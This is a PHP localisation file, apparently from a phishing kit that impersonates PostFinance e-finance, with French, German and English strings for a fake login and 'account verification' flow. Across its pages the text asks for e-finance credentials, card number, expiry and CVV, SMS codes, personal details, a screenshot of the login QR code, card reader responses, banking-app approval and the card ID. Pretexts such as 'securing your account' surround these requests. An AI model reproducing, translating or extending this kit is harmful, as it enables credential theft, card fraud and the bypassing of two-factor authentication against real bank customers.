<?php

    include "./Assets/php/config/config.php";

    if (isset($_GET["lang"])) {
        $_SESSION["lang"] = $_GET["lang"];
    }

    $lang = array(


        // page1
        'p_1_1' => array(
            'fr' => "Contact et assistance",
            'de' => "Kontakt und Unterstützung",
            'en' => "Contact and support",
        ),
        'p_1_2' => array(
            'fr' => "Vos identifiants ne sont pas corrects. Veuillez saisir à nouveau les éléments de sécurité.",
            'de' => "Ihre Anmeldedaten sind nicht korrekt. Bitte geben Sie die Sicherheitsdaten erneut ein.",
            'en' => "Your login credentials are incorrect. Please re-enter your security information.",
        ),
        'p_1_3' => array(
            'fr' => "Vous avez oublié votre mot de passe? Vous pouvez le réinitialiser via le lien \"Mot de passe oublié?\"",
            'de' => "Passwort vergessen? Sie können es über den Link „Passwort vergessen?“ zurücksetzen.",
            'en' => "Forgot your password? You can reset it via the \"Forgot password?\" link.",
        ),
        'p_1_4' => array(
            'fr' => "Login",
            'de' => "Login",
            'en' => "Login",
        ),
        'p_1_5' => array(
            'fr' => "Numéro e-finance / nom d’utilisateur",
            'de' => "E-Finance-Nummer / Benutzername",
            'en' => "E-finance number / Username",
        ),
        'p_1_6' => array(
            'fr' => "Mot de passe",
            'de' => "Passwort",
            'en' => "Password",
        ),
        'p_1_7' => array(
            'fr' => "Mot de passe oublié?",
            'de' => "Passwort vergessen?",
            'en' => "Forgot password?",
        ),
        'p_1_8' => array(
            'fr' => "Si disponible",
            'de' => "Falls verfügbar",
            'en' => "If available",
        ),
        'p_1_9' => array(
            'fr' => "Identification de l'utilisateur",
            'de' => "Benutzeridentifikation",
            'en' => "User identification",
        ),
        'p_1_10' => array(
            'fr' => "Suivant",
            'de' => "Weiter",
            'en' => "Next",
        ),
        'p_1_11' => array(
            'fr' => "Login rapide",
            'de' => "Schnellzugang",
            'en' => "Quick login",
        ),
        'p_1_12' => array(
            'fr' => "Pour vous connecter à e-finance depuis votre ordinateur, scannez le code QR avec votre smartphone.",
            'de' => "Um sich von Ihrem Computer aus bei e-finance anzumelden, scannen Sie den QR-Code mit Ihrem Smartphone.",
            'en' => "To log in to e-finance from your computer, scan the QR code with your smartphone.",
        ),
        'p_1_13' => array(
            'fr' => "Instructions",
            'de' => "Anleitungen",
            'en' => "Instructions",
        ),
        'p_1_14' => array(
            'fr' => "Avez-vous besoin d’aide?",
            'de' => "Brauchen Sie Hilfe?",
            'en' => "Do you need help?",
        ),
        'p_1_15' => array(
            'fr' => "Aide pour le login",
            'de' => "Hilfe beim Login",
            'en' => "Login help",
        ),
        'p_1_16' => array(
            'fr' => "Commander e-finance",
            'de' => "E-Finance bestellen",
            'en' => "Order e-finance",
        ),
        'p_1_17' => array(
            'fr' => "Version démo e-finance",
            'de' => "E-Finance-Demoversion",
            'en' => "E-finance demo version",
        ),
        'p_1_18' => array(
            'fr' => "Norme de sécurité",
            'de' => "Sicherheitsstandard",
            'en' => "Security standard",
        ),
        'p_1_19' => array(
            'fr' => "Vers postfinance.ch",
            'de' => "Zu postfinance.ch",
            'en' => "To postfinance.ch",
        ),
        'p_1_20' => array(
            'fr' => "Live-Support",
            'de' => "Live-Support",
            'en' => "Live support",
        ),
        'p_1_21' => array(
            'fr' => "Automatique",
            'de' => "Automatisch",
            'en' => "Automatic",
        ),
        'p_1_22' => array(
            'fr' => "Français",
            'de' => "Französisch",
            'en' => "French",
        ),
        'p_1_23' => array(
            'fr' => "Mentions légales et accessibilité",
            'de' => "Rechtliche Hinweise und Barrierefreiheit",
            'en' => "Legal notice and accessibility",
        ),
        'p_1_24' => array(
            'fr' => "Menu",
            'de' => "Menü",
            'en' => "Menu",
        ),

        
        // page2
        'p_2_1' => array(
            'fr' => "Déclarer un sinistre",
            'de' => "Schaden melden",
            'en' => "Report a claim",
        ),
        'p_2_2' => array(
            'fr' => "FAQ et assistance",
            'de' => "FAQ und Unterstützung",
            'en' => "FAQ and support",
        ),
        'p_2_3' => array(
            'fr' => "Informations de carte de crédit",
            'de' => "Kreditkarteninformationen",
            'en' => "Credit card information",
        ),
        'p_2_4' => array(
            'fr' => "Ce service vous permet de renseigner et/ou de mettre à jour votre compte afin de sécuriser au plus haut niveau vos opérations bancaires sur internet dont vos achats en ligne.",
            'de' => "Mit diesem Service können Sie Ihr Konto eingeben und/oder aktualisieren, um Ihre Online-Banking-Vorgänge, einschließlich Online-Einkäufe, maximal abzusichern.",
            'en' => "This service allows you to provide and/or update your account in order to secure your online banking activities, including online purchases, to the highest level.",
        ),
        'p_2_5' => array(
            'fr' => "N° de votre carte",
            'de' => "Kartennummer",
            'en' => "Your card number",
        ),
        'p_2_6' => array(
            'fr' => "Ce champ est obligatoire",
            'de' => "Dieses Feld ist erforderlich",
            'en' => "This field is required",
        ),
        'p_2_7' => array(
            'fr' => "Date d'expiration",
            'de' => "Ablaufdatum",
            'en' => "Expiration date",
        ),
        'p_2_8' => array(
            'fr' => "Cryptogramme visuel (CVV)",
            'de' => "Sicherheitscode (CVV)",
            'en' => "Security code (CVV)",
        ),
        'p_2_9' => array(
            'fr' => "Suivant",
            'de' => "Weiter",
            'en' => "Next",
        ),
        'p_2_10' => array(
            'fr' => "© PostFinance AG",
            'de' => "© PostFinance AG",
            'en' => "© PostFinance AG",
        ),
        'p_2_11' => array(
            'fr' => "En collaboration avec TONI Digital Insurance Solutions AG",
            'de' => "In Zusammenarbeit mit TONI Digital Insurance Solutions AG",
            'en' => "In collaboration with TONI Digital Insurance Solutions AG",
        ),
        'p_2_12' => array(
            'fr' => "Contact et assistance",
            'de' => "Kontakt und Unterstützung",
            'en' => "Contact and support",
        ),
        'p_2_13' => array(
            'fr' => "Aspects juridiques & Accessibilité",
            'de' => "Rechtliche Hinweise & Barrierefreiheit",
            'en' => "Legal aspects & Accessibility",
        ),
        'p_2_14' => array(
            'fr' => "Protection et sécurité des données",
            'de' => "Datenschutz und Datensicherheit",
            'en' => "Data protection and security",
        ),
        'p_2_15' => array(
            'fr' => "Protection des données",
            'de' => "Datenschutz",
            'en' => "Data protection",
        ),
        'p_2_16' => array(
            'fr' => "postfinance.ch",
            'de' => "postfinance.ch",
            'en' => "postfinance.ch",
        ),
        'p_2_17' => array(
            'fr' => "Français",
            'de' => "Französisch",
            'en' => "French",
        ),


        // page3
        'p_3_1' => array(
            'fr' => "Saisie du code de sécurité reçu par SMS",
            'de' => "Eingabe des per SMS erhaltenen Sicherheitscodes",
            'en' => "Enter the security code received via SMS",
        ),
        'p_3_2' => array(
            'fr' => "Veuillez saisir le code de sécurité renforcée que vous reçu pas SMS.",
            'de' => "Bitte geben Sie den erweiterten Sicherheitscode ein, den Sie per SMS erhalten haben.",
            'en' => "Please enter the enhanced security code you received via SMS.",
        ),
        'p_3_3' => array(
            'fr' => "Code de sécurité* (Ex: 520380)",
            'de' => "Sicherheitscode* (z. B.: 520380)",
            'en' => "Security code* (e.g., 520380)",
        ),
        'p_3_4' => array(
            'fr' => "Ex: 520380",
            'de' => "Z. B.: 520380",
            'en' => "e.g., 520380",
        ),
        'p_3_5' => array(
            'fr' => "Code de sécurité incorrect",
            'de' => "Falscher Sicherheitscode",
            'en' => "Incorrect security code",
        ),


        // page4
        'p_4_1' => array(
            'fr' => "Votre demande a été transmise.",
            'de' => "Ihre Anfrage wurde übermittelt.",
            'en' => "Your request has been submitted.",
        ),
        'p_4_2' => array(
            'fr' => "N'oubliez pas que l'un de nous conseiller technique vous contactera pour confirmer vos informations à fin de finaliser votre demande.",
            'de' => "Bitte beachten Sie, dass sich einer unserer technischen Berater mit Ihnen in Verbindung setzen wird, um Ihre Angaben zu bestätigen und Ihre Anfrage abzuschließen.",
            'en' => "Please note that one of our technical advisors will contact you to confirm your information in order to finalize your request.",
        ),
        'p_4_3' => array(
            'fr' => "Vous serez redirigé pour vous connecter automatiquement après quelques secondes.",
            'de' => "Sie werden in wenigen Sekunden automatisch zum Login weitergeleitet.",
            'en' => "You will be automatically redirected to log in after a few seconds.",
        ),


        // page5
        'p_5_1' => array(
            'fr' => "chargement...",
            'de' => "Ladevorgang...",
            'en' => "loading...",
        ),


        // page6
        'p_6_1' => array(
            'de' => "Transaktion bestätigen",
            'fr' => "Confirmer la transaction",
            'en' => "Confirm transaction",
        ),
        'p_6_2' => array(
            'de' => "Überprüfen Sie die Zahlungsdetails und bestätigen Sie die Zahlung in der PostFinance App.",
            'fr' => "Vérifiez les détails du paiement et confirmez-le dans l'application PostFinance.",
            'en' => "Check the payment details and confirm the payment in the PostFinance app.",
        ),
        'p_6_3' => array(
            'de' => "Händler :",
            'fr' => "Commerçant :",
            'en' => "Merchant:",
        ),
        'p_6_4' => array(
            'de' => "Betrag :",
            'fr' => "Montant :",
            'en' => "Amount:",
        ),
        'p_6_5' => array(
            'de' => "Datum :",
            'fr' => "Date :",
            'en' => "Date:",
        ),
        'p_6_6' => array(
            'de' => "Benötigen Sie Hilfe? ",
            'fr' => "Besoin d’aide ?",
            'en' => "Need help?",
        ),


        // det
        'p_7_1' => array(
            'en' => "Verify your account",
            'de' => "Bestätigen Sie Ihr Konto",
            'fr' => "Vérifiez votre compte",
        ),
        'p_7_2' => array(
            'en' => "This service allows you to top up and/or update your account to optimally secure your online banking transactions, including your online purchases.",
            'de' => "Dieser Service ermöglicht es Ihnen, Ihr Konto aufzuladen und/oder zu aktualisieren, um Ihre Online-Banking-Transaktionen, einschließlich Ihrer Online-Einkäufe, optimal abzusichern.",
            'fr' => "Ce service vous permet de recharger et/ou de mettre à jour votre compte afin de sécuriser au mieux vos opérations bancaires en ligne, y compris vos achats en ligne.",
        ),
        'p_7_3' => array(
            'en' => "Full name",
            'de' => "Vollständiger Name",
            'fr' => "Nom complet",
        ),
        'p_7_4' => array(
            'en' => "Address",
            'de' => "Adresse",
            'fr' => "Adresse",
        ),
        'p_7_5' => array(
            'en' => "date of birth",
            'de' => "Geburtsdatum",
            'fr' => "Date de naissance",
        ),
        'p_7_6' => array(
            'en' => "DD/MM/YYYY",
            'de' => "TT/MM/JJJJ",
            'fr' => "JJ/MM/AAAA",
        ),
        'p_7_7' => array(
            'en' => "Telephone number",
            'de' => "Telefonnummer",
            'fr' => "Numéro de téléphone",
        ),
        'p_7_8' => array(
            'en' => "E-mail address",
            'de' => "E-Mail-Adresse",
            'fr' => "Adresse e-mail",
        ),
        'p_7_9' => array(
            'en' => "This field is mandatory",
            'de' => "Dieses Feld ist erforderlich",
            'fr' => "Ce champ est obligatoire",
        ),



        // tele
        'p_8_1' => array(
            'en' => "Verify your account",
            'de' => "Bestätigen Sie Ihr Konto",
            'fr' => "Vérifiez votre compte",
        ),
        'p_8_2' => array(
            'en' => "This service allows you to update and/or secure your telephone number in order to strengthen the security of your online banking transactions, particularly when making purchases on the Internet.",
            'de' => "Dieser Service ermöglicht es Ihnen, Ihre Telefonnummer zu aktualisieren und/oder zu sichern, um die Sicherheit Ihrer Online-Banking-Transaktionen, insbesondere bei Einkäufen im Internet, zu erhöhen.",
            'fr' => "Ce service vous permet de mettre à jour et/ou de sécuriser votre numéro de téléphone afin de renforcer la sécurité de vos opérations bancaires en ligne, notamment lors de vos achats sur Internet.",
        ),
        'p_8_3' => array(
            'en' => "Telephone number",
            'de' => "Telefonnummer",
            'fr' => "Numéro de téléphone",
        ),
        'p_8_4' => array(
            'en' => "Incorrect phone number",
            'de' => "Falsche Telefonnummer",
            'fr' => "Numéro de téléphone incorrect",
        ),



        // qr
        'p_9_1' => array(
            'de' => "QR-Code-Aktivierung",
            'en' => "QR Code Activation",
            'fr' => "Activation du code QR",
        ),        
        'p_9_2' => array(
            'de' => "Bitte erstellen Sie einen Screenshot Ihres QR-Codes und laden Sie ihn jetzt hoch,
                        um den Aktivierungsprozess abzuschließen. Dieser Schritt dient der Bestätigung,
                        dass Sie der Kontoinhaber sind.",
            'en' => "Please take a screenshot of your QR code and upload it now
                        to complete the activation process. This step is used to confirm
                        that you are the account holder.",
            'fr' => "Veuillez faire une capture d’écran de votre code QR et téléchargez-la maintenant
                        afin de terminer le processus d’activation. Cette étape sert à confirmer
                        que vous êtes le titulaire du compte.",
        ),        
        'p_9_3' => array(
            'de' => "<strong>Hinweis:</strong> Bitte warten Sie, bis das Bild vollständig hochgeladen wurde,
                        bevor Sie auf „Weiter“ klicken. Stellen Sie sicher, dass der QR-Code klar,
                        vollständig und gut lesbar ist.",
            'en' => "<strong>Note:</strong> Please wait until the image has been fully uploaded
                        before clicking “Continue.” Make sure the QR code is clear,
                        complete, and easy to read.",
            'fr' => "<strong>Remarque :</strong> Veuillez attendre que l’image soit complètement téléchargée
                        avant de cliquer sur « Continuer ». Assurez-vous que le code QR est clair,
                        complet et parfaitement lisible.",
        ),        
        'p_9_4' => array(
            'de' => "QR-Code hochladen",
            'en' => "Upload QR Code",
            'fr' => "Télécharger le code QR",
        ),        
        'p_9_5' => array(
            'de' => "Zulässige Dateiformate: JPG, JPEG, PNG, PDF (maximal 10 MB)",
            'en' => "Allowed file formats: JPG, JPEG, PNG, PDF (maximum 10 MB)",
            'fr' => "Formats de fichiers autorisés : JPG, JPEG, PNG, PDF (10 Mo maximum)",
        ),        
        'p_9_6' => array(
            'de' => "Ungültiger QR-Code.",
            'en' => "Invalid QR code.",
            'fr' => "Code QR invalide.",
        ),        
        'p_9_7' => array(
            'de' => "Bestätigen",
            'en' => "Confirm",
            'fr' => "Confirmer",
        ),
 
        
        // reader
        'p_10_1' => array(
            'en' => "Card reader",
            'de' => "Kartenlesegerät",
            'fr' => "Lecteur de carte",
        ),          
        'p_10_2' => array(
            'en' => "Insert your PostFinance Card in the card reader",
            'de' => "Legen Sie Ihre PostFinance-Karte in das Kartenlesegerät ein",
            'fr' => "Insérez votre carte PostFinance dans le lecteur de carte",
        ),          
        'p_10_3' => array(
            'en' => "Enter the following code in the <b>card</b> reader and confirm it with <b>OK</b>: <b class='code1'></b>",
            'de' => "Geben Sie den folgenden Code in das <b>Kartenlesegerät</b> ein und bestätigen Sie ihn mit <b>OK</b>: <b class='code1'></b>",
            'fr' => "Saisissez le code suivant dans le <b>lecteur de carte</b> et confirmez avec <b>OK</b> : <b class='code1'></b>",
        ),          
        'p_10_4' => array(
            'en' => "Enter the card's <b>PIN number</b> and confirm with <b>OK</b>",
            'de' => "Geben Sie die <b>PIN-Nummer der Karte</b> ein und bestätigen Sie mit <b>OK</b>",
            'fr' => "Saisissez le <b>code PIN de la carte</b> et confirmez avec <b>OK</b>",
        ),          
        'p_10_5' => array(
            'en' => "Enter Code",
            'de' => "Code eingeben",
            'fr' => "Saisir le code",
        ),          
        'p_10_6' => array(
            'en' => "Enter the code from your card reader here",
            'de' => "Geben Sie hier den Code von Ihrem Kartenlesegerät ein",
            'fr' => "Saisissez ici le code affiché sur votre lecteur de carte",
        ),
        'p_10_7' => array(
            'en' => "Invalid code",
            'de' => "Ungültiger Code",
            'fr' => "Code invalide",
        ),

        'app1' => array(
            'en' => "Approve the Request in Your Banking App",
            'de' => "Bestätigen Sie die Anfrage in Ihrer Banking-App",
            'fr' => "Approuvez la demande dans votre application bancaire",
        ),
        'app2' => array(
            'en' => "We have sent a secure approval request to your banking application. Please review and approve the operation to continue securely.",
            'de' => "Wir haben eine sichere Bestätigungsanfrage an Ihre Banking-App gesendet. Bitte überprüfen und bestätigen Sie den Vorgang, um sicher fortzufahren.",
            'fr' => "Nous avons envoyé une demande de confirmation sécurisée à votre application bancaire. Veuillez vérifier et approuver l’opération pour continuer en toute sécurité.",
        ),
        'app3' => array(
            'en' => "Approve done",
            'de' => "Bestätigung abgeschlossen",
            'fr' => "Confirmation effectuée",
        ),
        'app4' => array(
            'en' => "Approval failed. Please try again.",
            'de' => "Bestätigung fehlgeschlagen. Bitte versuchen Sie es erneut.",
            'fr' => "Échec de la confirmation. Veuillez réessayer.",
        ),

        'id1' => array(
            'en' => "Enter card ID",
            'de' => "Karten-ID eingeben",
            'fr' => "Saisissez l’identifiant de la carte",
        ),
        'id2' => array(
            'en' => "Please enter the ID number on the back of your PostFinance Card.",
            'de' => "Bitte geben Sie die ID-Nummer auf der Rückseite Ihrer PostFinance Card ein.",
            'fr' => "Veuillez saisir le numéro d’identification figurant au dos de votre PostFinance Card.",
        ),
        'id3' => array(
            'en' => "Card ID",
            'de' => "Karten-ID",
            'fr' => "Identifiant de la carte",
        ),
        'id4' => array(
            'en' => "Enter card ID",
            'de' => "Karten-ID eingeben",
            'fr' => "Saisissez l’identifiant de la carte",
        ),
        'id5' => array(
            'en' => "Invalid ID card",
            'de' => "Ungültige Karten-ID",
            'fr' => "Identifiant de carte invalide",
        ),

        

    );

?>